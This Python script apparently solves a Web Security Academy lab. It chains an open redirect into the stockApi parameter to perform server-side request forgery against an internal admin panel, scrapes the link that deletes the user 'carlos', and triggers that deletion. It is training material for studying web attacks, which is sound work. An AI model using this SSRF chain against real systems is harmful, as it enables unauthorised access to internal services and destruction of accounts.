from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup


def solve_lab(session):
    path = "/product/stock"

    open_redirect_prefix = "/product/nextProduct?currentProductId=1&path="
    admin_url = "http://192.168.0.12:8080/admin"
    data = {"stockApi": f"{open_redirect_prefix}{admin_url}"}

    logger.info(
        f'Performing an SSRF attack by sending a POST request to "{path}" with the following data:'
    )
    logger.info(f"{data}")

    resp = session.post_path(path, data=data)
    logger.success("POST request sent successfully.")

    logger.info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        logger.failure("Unable to find URL.")
        return
    else:
        ssrf = tag.get("href")[1:]
        logger.success(f"Found URL: {ssrf}")

    data = {"stockApi": f"{open_redirect_prefix}{ssrf}"}
    logger.info(
        f'Deleting the user carlos by sending a POST request to "{path}" with the following data:'
    )
    logger.info(f"{data}")

    resp = session.post_path(path, data=data)
    logger.success("POST request sent successfully.")
